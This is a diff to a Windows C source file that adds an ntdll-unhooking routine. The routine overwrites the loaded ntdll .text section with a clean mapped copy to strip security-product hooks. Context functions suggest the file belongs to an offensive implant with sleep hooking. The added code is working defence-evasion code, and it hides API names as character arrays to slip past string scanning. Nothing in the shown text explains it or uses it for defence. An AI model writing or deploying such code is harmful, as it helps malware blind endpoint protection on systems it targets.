@@ -491,6 +491,53 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
 
 }
 
+static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
+
+    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+    typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+    typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+    typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
+
+    DWORD oldprotect = 0;
+    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
+    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
+    int i;
+
+    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
+    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+    VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);
+
+    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
+            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
+            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                pImgSectionHead->Misc.VirtualSize,
+                PAGE_EXECUTE_READWRITE,
+                &oldprotect);
+            if (!oldprotect) {
+                return -1;
+            }
+            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                pImgSectionHead->Misc.VirtualSize);
+
+            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                pImgSectionHead->Misc.VirtualSize,
+                oldprotect,
+                &oldprotect);
+            if (!oldprotect) {
+                return -1;
+            }
+            return 0;
+        }
+    }
+
+    return -1;
+}
+
+
 
 void HookSleep() {
     SIZE_T bytesRead = 0;
